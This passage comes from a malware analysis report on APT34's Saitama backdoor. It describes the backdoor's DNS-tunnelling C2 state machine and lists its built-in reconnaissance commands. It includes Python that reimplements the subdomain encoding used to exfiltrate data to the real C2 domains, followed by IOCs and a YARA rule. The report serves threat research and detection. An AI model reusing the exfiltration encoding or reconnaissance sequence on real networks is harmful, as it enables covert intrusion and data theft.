PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\naq3888gai. [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\n\n\n```\nIf successfully connected to the generated domain, the malware start processing the received data by converting the IP\naddress to byte array and add it `ListData . Since the max number of bytes could be received from one connection is 4. so`\nmultiple connections needed if more than 4 bytes would be received .\nThe first octet will be task type and the rest will be the\ncommand only if the `Received Size is 4. If it’s more than that, the first octet of the first IP address of the generated`\ndomain will be the task type and IP addresses from the other generated domains will just be appended to it .\nAfter all data\nhave been received the malware move to new state `Do .`\n\n## Do State\n\nAs we can see `tasktype was assigned the first octet and the others octets assigned to` `array2, we have 5 task types .`\nso it might write a file on disk, if data was compressed then it will be decompressed then written to the file. The malware can\nalthough execute a built in command or other commands sent by the C2.\nIf a file is going to be written then a path should be\nspecified,so the path of the file will be the bytes of `array2 from beginning until it match a` `| char, and the other bytes are`\nthe file content .\n\n\n-----\n\nTask types :\n\n**TaskType** **Values**\n\nEnums.TaskType Static 43\n\nEnums.TaskType Cmd 70\n\nEnums.TaskType CompressedCmd 71\n\nEnums.TaskType File 95\n\nEnums.TaskType CompressedFile 96\n\nIf the malware going to execute one of the built in commands, an interesting non-cryptographic hashing function (FNV-1a)\ncomputes the command number, actually it just related to performance and C# compiler and not how the malware operate .\n\n## Built in Commands\n\n\n-----\n\nSome of commands are common reconnaissance but some of them are not that common. Some of the commands contain\ninternal IPs and also internal domain names . That indicates that the actor has some previous knowledge about the internal\ninfrastructure of the Organization .\nThese commands are executed through PowerShell or through CMD .\n\n**Command**\n**Number** **Interpreter** **Payload** **Impact**\n\n\n1 PowerShell Get-NetIPAddress -AddressFamily IPv4 | Select-Object\nIPAddresss\n\n2 PowerShell Get-NetNeighbor -AddressFamily IPv4 | Select-Object\nIPADDress\n\n\nGets IP address for all IPv4\naddresses on the computer.\n\nGets information about the neighbor\ncache for IPv4, Gets neighbor\ncache information only about a\nspecific neighbor IP address.\n\n\n3 CMD whoami Display the domain and user name\nof the person who is currently\nlogged on to this computer\n\n4 PowerShell [System.Environment]::OSVersion.VersionString OS veriosn\n\n5 CMD net user List of every user account, active or\nnot, on the computer you're\ncurrently using.\n\n\n7 PowerShell Get-ChildItem -Path \"C:\\Program Files\" | Select-Object\nName\n\n8 PowerShell Get-ChildItem -Path 'C:\\Program Files (x86)' | SelectObject Name\n\n\nList folders under C:\\Program Files\ninstalled programes\n\nList folders under C:\\Program Files\n(x86) installed programes\n\n\n9 PowerShell Get-ChildItem -Path 'C:' | Select-Object Name List folders under C\n\n10 CMD hostname Display the name of the computer\n\n\n11 PowerShell Get-NetTCPConnection | Where-Object {$_.State -eq\n\"Established\"} | Select-Object \"LocalAddress\",\n\"LocalPort\", \"RemoteAddress\", \"RemotePort\"\n\n12 PowerShell $(ping -n 1 10.65.4.50 | findstr /i ttl) -eq $null; $(ping -n 1\n10.65.4.51 | findstr /i ttl) -eq $null; $(ping -n 1\n10.65.65.65 | findstr /i ttl) -eq $null; $(ping -n 1\n10.65.53.53 | findstr /i ttl) -eq $null;$(ping -n 1\n10.65.21.200 | findstr /i ttl) -eq $null\n\n13 PowerShell nslookup ise-posture.mofagov.gover.local | findstr /i\nAddress;nslookup webmail.gov.jo | findstr /i Address\n\n14 PowerShell $(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null;$(ping -n\n1 10.10.19.201 | findstr /i ttl) -eq $null;$(ping -n 1\n10.10.19.202 | findstr /i ttl) -eq $null;$(ping -n 1\n10.10.24.200 | findstr /i ttl) -eq $null\n\n15 PowerShell $(ping -n 1 10.10.10.4 | findstr /i ttl) -eq $null; $(ping -n 1\n10.10.50.10 | findstr /i ttl) -eq $null; $(ping -n 1\n10.10.22.50 | findstr /i ttl) -eq $null; $(ping -n 1\n10.10.45.19 | findstr /i ttl) -eq $null\n\n16 PowerShell $(ping -n 1 10.65.51.11 | findstr /i ttl) -eq $null;$(ping -n\n1 10.65.6.1 | findstr /i ttl) -eq $null;$(ping -n 1\n10.65.52.200 | findstr /i ttl) -eq $null;$(ping -n 1\n10.65.6.3 | findstr /i ttl) -eq $null\n\n17 PowerShell $(ping -n 1 10.65.45.18 | findstr /i ttl) -eq $null; $(ping -n\n1 10.65.28.41 | findstr /i ttl) -eq $null; $(ping -n 1\n10.65.36.13 | findstr /i ttl) -eq $null; $(ping -n 1\n10.65.51.10 | findstr /i ttl) -eq $null\n\n\nGets all TCP connections that have\nan Established state.\n\nChecking if these internal IPs are\nalive\n\nGet IP Address of the domains iseposture.mofagov.gover.local and\nnslookup webmail.gov.jo\n\nChecking if these internal IPs are\nalive\n\nChecking if these internal IPs are\nalive\n\nChecking if these internal IPs are\nalive\n\nChecking if these internal IPs are\nalive\n\n\n-----\n\n18 PowerShell $(ping -n 1 10.10.22.42 | findstr /i ttl) -eq $null;$(ping -n\n1 10.10.23.200 | findstr /i ttl) -eq $null;$(ping -n 1\n10.10.45.19 | findstr /i ttl) -eq $null;$(ping -n 1\n10.10.19.50 | findstr /i ttl) -eq $null\n\n19 PowerShell $(ping -n 1 10.65.45.3 | findstr /i ttl) -eq $null;$(ping -n 1\n10.65.4.52 | findstr /i ttl) -eq $null;$(ping -n 1\n10.65.31.155 | findstr /i ttl) -eq $null;$(ping -n 1 iseposture.mofagov.gover.local | findstr /i ttl) -eq $null\n\n20 PowerShell Get-NetIPConfiguration | Foreach IPv4DefaultGateway |\nSelect-Object NextHop\n\n21 PowerShell Get-DnsClientServerAddress -AddressFamily IPv4 |\nSelect-Object SERVERAddresses\n\n\nChecking if these internal IPs are\nalive\n\nChecking if these internal IPs are\nalive\n\nGets network configuration,\nincluding usable interfaces, IP\naddresses, and DNS servers.\nIPv4DefaultGateway, Gets default\ngatewayes for all interfaces\n\nGets all DNS server IP addresses\nassociated with the interfaces on the\ncomputer only ipv4.\n\n\n22 CMD systeminfo | findstr /i \\\"Domain\\\" Get domain name\n\nThe result of the executed command is stored in `resultData and char` `= is appended at the first if the data is`\ncompressed else char 9, then pass it to `ReadySend function which assign the` `resultData to` `SendData .`\n\n## Send State\n\nAfter getting the result from the command execution the malware need a way to send it to the C2.\nThis is how the malware\nexfiltrated the data. It may look like a simple DNS request in a network log, but the exfiltrated data is actually built into the\nDNS request, the malware send 12 bytes at time or less if there is no full 12 bytes to send.\n\n\n-----\n\nIf it s the first time to send part from the `ResultDate,\nThe malware generate different subdomains constructed with the`\nfollowing steps:\n\n1. Passed data = converted `SendByteIndex to char and pad it with the first char in` `CharDomain + converted`\n```\n   SendDataSize to char and pad it with the first char in CharDomain + base32 encode of the resultData .\n\n```\n2. Convert domaintype to character and + the converted `AgentId to character + data passed.`\n3. Use the counter that was randomly generated as a seed to MersenneTwister to generate random numbers and return\n\n36 random char and numbers.\n4. Map step 1 output to the shuffled chars .\n5. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n6. Then append random domain form the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com\n\n```\n7. Generated domain = step 5 output + step 6 output + step 6 output\n8. The counter is increased if the malware was successfully connected to the generated domain .\n\nIf it’s not the first time, the malware generate different subdomains constructed with the following steps:\n\n1. Passed data = converted `SendByteIndex to char and pad it with the first char in` `CharDomain + base32 encode of`\n\nthe resultData .\n2. Convert domaintype to character and + the converted `AgentId to character + data passed.`\n3. Use the counter that was randomly generated as a seed to MersenneTwister to generate random numbers and return\n\n36 random char and numbers.\n4. Map step 1 output to the shuffled chars ..\n5. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n6. Then append random domain form the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com\n\n```\n7. Generated domain = step 4 output + step 5 output + step 6 output\n8. The counter is increased if the malware was successfully connected to the generated domain .\n\nIf successfully connected to the generated domain, it check if there is data to be received and if there is still more data to be\nsent the machine will go to `SendAndReceive state.`\n\n\n-----\n\nFor simplicity we consider the data to be send not compressed . The generated subdomain will be like :\n```\nseed = 6540\n\nAgentID = 203\n\nSendAndReceive = 1\n\nSendDataSize = 38\n\nSendByteIndex = 0\n\nval = SendDataSize - SendByteIndex;\n\nnum = min(12, val);\n\nSendData = b'9We Are Breaking APT34 In This Report!' # 9 indicates that it's not compressed\n\nSendData = base64.b32encode(SendData[SendByteIndex:num]).replace(b\"=\",b\"\").lower().decode()\n\ndata = PadLeft(ConvertIntToDomain(SendByteIndex),3,CharsDomain[0]) +\nPadLeft(ConvertIntToDomain(SendDataSize),3,CharsDomain[0]) + SendData\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(SendAndReceive) + ConvertIntToDomain(AgentID) + data\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\n1mcllll1zvmu259z1hxnnlsfnawssgad.\n\n\n```\nIf it isn’t the first time to send part of the data . The generated subdomain will be like : :\n\n\n-----\n\n```\nAgentID = 203\n\nSendAndReceive = 3\n\nSendDataSize = 38\n\nSendByteIndex = 12 # send next 12 bytes\n\nval = SendDataSize - SendByteIndex;\n\nnum = min(12, val);\n\nSendData = b'9We Are Breaking APT34 In This Report!'\n\nSendData = base64.b32encode(SendData[SendByteIndex:SendByteIndex+num]).replace(b\"=\",b\"\").lower().decode()\n\ndata =  PadLeft(ConvertIntToDomain(SendDataSize),3,CharsDomain[0]) + SendData\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(SendAndReceive) + ConvertIntToDomain(AgentID) + data\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\ndgxmnu11rfyvvmcgcgcavr6n6wgax.\n\n```\nSo how the C2 will know what is the data sent !, Here is a little example demonstrating it .\n\n\n-----\n\n```\n                       g g y\nSeed = 0\n\nDomainTypes = {\n\n\"a\":\"FirstAlive\",\n\n\"b\":\"Send\"\n\n,\"c\":\"Receive\"\n\n,\"d\":\"SendAndReceive\"\n\n,\"e\":\"MainAlive\"}\n\ndict = { 57:\"Not Compressed\", 61:\"Compressed\"}\n\ndef MapBaseSubdomainCharacters_inverse(data, shuffle):\n\n    text = \"\"\n\n    CharsDomain = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n\n    for i in data:\n\n      text += CharsDomain[shuffle.find(i)]\n\n    return text\n\n# Get Seed\n\nfor i in range(46656):\n\n  if Domain[-3:] == PadLeft(ConvertIntToCounter(i),3,CharsCounter[0]):\n\n      Seed = i\n\n      break\n\nshuffle = Shuffle(Seed)\n\nDomain_Inv = MapBaseSubdomainCharacters_inverse(Domain[:-3],shuffle)\n\ndomaintype = Domain_Inv[0]\n\ndata = Domain_Inv[-20:]\n\n# for the frist connection we know SendByteIndex will be 0 which is equal to aaa after converting it to char and\npad it\n\nSendByteIndex_offset = Domain_Inv.find(\"aaa\")\n\nAgentId = Domain_Inv[1:SendByteIndex_offset]\n\nDataSize = Domain_Inv[SendByteIndex_offset+3:SendByteIndex_offset+6]\n\n# Get AgentId\n\nfor i in range(255):\n\n  if AgentId == ConvertIntToDomain(i):\n\n   AgentId = i\n\n   break\n\n# Get DataSize\n\nfor i in range(255): # size can exceed 255 of course\n\n  if DataSize == PadLeft(ConvertIntToDomain(i),3,CharsDomain[0]):\n\n   DataSize = i\n\n   break\n\n# pad and decode data\n\nData = base64.b32decode(data.upper()+\"=\"*(len(data)%8))  \n\nprint(\"Seed :\", Seed)\n\nprint(\"AgentId :\",AgentId)\n\nprint(\"Domain Type :\", DomainTypes[domaintype])\n\nprint(\"Size :\",DataSize)\n\nprint(\"Send Data :\",Data[1::])\n\nprint(dict[Data[0]])\n\n\nSeed : 6540\n\nAgentId : 203\n\nDomain Type : Send\n\nSize : 38\n\nSend Data : b'We Are Brea'\n\nNot Compressed\n\n## Receive and Send state\n\n```\n\n-----\n\nThe malware generate different subdomains constructed with the following steps:\n\n1. Passed data = converted `SendByteIndex to char and pad it with the first char in` `CharDomain + converted`\n```\n   ReceiveByteIndex to char and pad it with the first char in CharDomain + base32 encode of the resultData .\n\n```\n2. Convert domaintype to character and + the converted `AgentId to character + data passed.`\n3. Use the counter that was randomly generated as a seed to MersenneTwister to generate random numbers and return\n\n36 random char and numbers.\n4. Map step 1 output to the shuffled chars .\n5. Convert seed ( counter ) to char and pad it with the first char in `CharCounter .`\n6. Then append random domain form the 3 that exists `joexpediagroup.com,` `asiaworldremit.com,` `uber-`\n```\n   asia.com\n\n```\n7. Generated domain = step 4 output + step 5 output + step 6 output\n8. The counter is increased if the malware was successfully connected to the generated domain .\n\nThen process data as seen in `Receive function and check if all the data was sent or their are more to send .\nand then it go`\nto `Send state or` `Receive state or` `Do state depends on the check made.`\n\nLet’s consider that there was data to be received after sending the first 12 bytes, so state will change from `Send to`\n```\nReceiveandSend state . And here is how the domain will be generated:\n\n```\n\n-----\n\n```\nAgentID = 203\n\nSendAndReceive = 3\n\nSendDataSize = 38\n\nSendByteIndex = 12\n\nReceiveByteIndex = 0\n\nval = SendDataSize - SendByteIndex;\n\nnum = min(12, val);\n\nSendData = b'9We Are Breaking APT34 In This Report!'\n\nSendData = base64.b32encode(SendData[SendByteIndex:SendByteIndex+num]).replace(b\"=\",b\"\").lower().decode()\n\ndata = PadLeft(ConvertIntToDomain(SendByteIndex),3,CharsDomain[0]) +\nPadLeft(ConvertIntToDomain(ReceiveByteIndex),3,CharsDomain[0]) + SendData\n\nshuffle = Shuffle(seed)\n\ndomain = ConvertIntToDomain(SendAndReceive) + ConvertIntToDomain(AgentID) + data\n\nDomain = MapBaseSubdomainCharacters(domain, shuffle) + PadLeft(ConvertIntToCounter(seed),3,CharsCounter[0]) + \".\"\n\nprint(Domain + \" [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\")\n\ndgxmmammm11rfyvvmcgcgcavr6n6wgax. [ joexpediagroup.com | asiaworldremit.com | uber-asia.com ]\n\n## Final Recap\n\n```\n1. Mutex created .\n2. Machine States dictionary create which control the states transaction, and every state do different job .\n3. Config initialized .\n4. First state is `Begin and a command` `Start` changes state to `Alive .`\n5. Try to call `FirstAlive untill it succeed or exceed maximum tries, set` `AgentId if succeed.`\n6. `MainAlive is called and check if data will be received move to` `Receive state.`\n7. `Receive state receive the command to be executed then move to` `Do state .`\n8. `Do state will execute the specified command, and the result will be sent to the C2 so the malware will move to` `Send`\n\nstate.\n9. `Send state will send the result of the executed command, and check if there is more data that will be received, if`\n\nfound and the data being sent wasn’t fully sent yet, the malware move to `ReceiveandSend state.`\n\nSaitama abuses the DNS protocol for its C2 communications. This is stealthier than other communication methods. Also\nuses techniques such as compression and long random sleep times to disguise malicious traffic in between legitimate traffic.\n\n## IOCs\n\nHashes:\n\n1. Maldoc (Confirmation Receive Document.xls) :\n\nmd5 : `C4F81486D10818E0BD4B9701DCAFC8A2`\n\nsha1 : `15A1B1EBF04870AAD7EA4BD7D0264F17057E9002`\n\nsha256 : `26884F872F4FAE13DA21FA2A24C24E963EE1EB66DA47E270246D6D9DC7204C2B`\n\nssdeep :\n\n```\n12288:NfjOjlJUDo0DcsUD65oNxWqUOsDmlYh5edDxcSjrUlCZiJxIlxSLaMpgA0DfZT5r:VOjlJKrqUKEIlxSLh0Djme\n\n```\n\n2. update.exe (Saitama backdoor) :\n\nmd5 : `79C7219BA38C5A1971A32B50E14D4A13`\n\nsha1 : `B39B3A778F0C257E58C0E7F851D10C707FBE2666`\n\nsha256 : `E0872958B8D3824089E5E1CFAB03D9D98D22B9BCB294463818D721380075A52D`\n\nimphash : `F34D5F2D4577ED6D9CEEC516C1F5A744`\n\nssdeep : `768:bEj9FSWZxm3eJ38Etub7B/iGkIJywnYwVMwfJhVRVmHUFeP+SVL/mVW5iV7uVSxH:gaSLub7W8`\n\n\n-----\n\n3. Microsoft.Exchange.WebServices.dll:\n\nmd5 : `F9A1B01E2D5C4CB2D632A74FCB7EC2DD`\n\nsha1 : `5A9B17A0510301725DCEAFFF026ECA872FB05579`\n\nsha256 : `7EBBEB2A25DA1B09A98E1A373C78486ED2C5A7F2A16EEC63E576C99EFE0C7A49`\n\nimphash : `DAE02F32A21E03CE65412F6E56942DAA`\n\nssdeep : `12288:m/uKlFauqcCJ781wrckIE/9dCuyk05CGCIYzmA/VMmy5PJ+S:m/uKlFaFV8EdCuyk05CDdzPry5PJ1`\n\n4. update.exe.config:\n\nmd5 : `AFDC68F0B6CE87EBEF0FEC5565C80FD3`\n\nsha1 : `2641A3CC98AA84979BE68B675E26E5F94F059B57`\n\nsha256 : `09C19455F249514020A4075667B087B16EAAD440938F2D139399D21117879E60`\n\nssdeep :\n\n```\n3:JLWMNHU8LdgCQcIMOoIRuQVK/FNURAmIRMNHNQAolFNURAmIRMNHjFN5KWREBAWq:JiMVBd1IffVKNC7VNQAofC7VrpuAW4QA\n\n```\n\nMutex : `726a06ad-475b-4bc6-8466-f08960595f1e`\n\nFiles:\n\n1. C:\\Users\\UserName\\AppData\\Local\\MicrosoftUpdate\\Microsoft.Exchange.WebServices.dll\n2. C:\\Users\\UserName\\AppData\\Local\\MicrosoftUpdate\\update.exe.config\n3. C:\\Users\\UserName\\AppData\\Local\\MicrosoftUpdate\\update.exe\nC2 Domains:\n\n1. uber-asia.com\n2. asiaworldremit.com\n3. joexpediagroup.com\n\n## Yara Rules\n\n\n-----\n\n```\n            g g\n{\n\n  meta:\n\n    Author = \"X__Junior\"\n\n    Description = \"APT34_Saitama_Agent Detection\"\n\n\n  strings:\n\n     $GetRandomRange = {04 03 59 0A 02 28 ?? ?? ?? ?? 0B 03 6A 07 6E 06 6A 5D 58 69 2A}\n\n     $random = {7E ?? ?? ?? ?? 0A 06 6F ?? ?? ?? ?? 0B 7E ?? ?? ?? ?? 0C 02 73 ?? ?? ?? ?? 0D 16 13 ?? 2B ??\n09 16 06 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 13 ?? 08 06 11 ?? 6F ?? ?? ?? ?? 13 ?? 12 ?? 28 ?? ?? ?? ?? 28 ?? ??\n?? ?? 0C 06 11 ?? 17 6F 46 ?? ?? ?? 0A 11 ?? 17 58 13 ?? 11 ?? 07 32 ?? 08 2A }\n\n     $MapBaseSubdomainCharacters = {7E ?? ?? ?? ?? 0A 16 0B 2B ?? 06 03 7E ?? ?? ?? ?? 02 07 6F ?? ?? ?? ?? \n6F ?? ?? ?? ??  6F ?? ?? ?? ?? 0C 12 ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 07 17 58 0B 07  02 6F ?? ?? ?? ?? \n32 ??  06 2A}\n\n     $s1 = \"E:\\\\Saitama\\\\Saitama.Agent\\\\obj\\\\Release\\\\Saitama.Agent.pdb\" ascii\n\n    $s2 = \"Saitama.Agent\" ascii\n\n    $s3 = \"razupgnv2w01eos4t38h7yqidxmkljc6b9f5\" wide\n\n    $s4 = \"joexpediagroup.com\" wide\n\n    $s5 = \"asiaworldremit.com\" wide\n\n    $s6 = \"uber-asia.com\" wide\n\n    $s7 = \"Saitama.Agent.exe\" ascii\n\n  condition:\n\n    uint16(0) == 0x5A4D and 3 of($s*) and $GetRandomRange and $random and $MapBaseSubdomainCharacters\n\n}\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-24 - APT34 - Saitama Agent.pdf"
    ],
    "report_names": [
        "2022-06-24 - APT34 - Saitama Agent.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1673535762,
    "ts_updated_at": 1743041648,
    "ts_creation_date": 1656803954,
    "ts_modification_date": 1656803954,
    "files": {
        "pdf": "https://archive.orkl.eu/6f3769d1dae0af39a829320b889b85a8956623dc.pdf",
        "text": "https://archive.orkl.eu/6f3769d1dae0af39a829320b889b85a8956623dc.txt",
        "img": "https://archive.orkl.eu/6f3769d1dae0af39a829320b889b85a8956623dc.jpg"
    }
}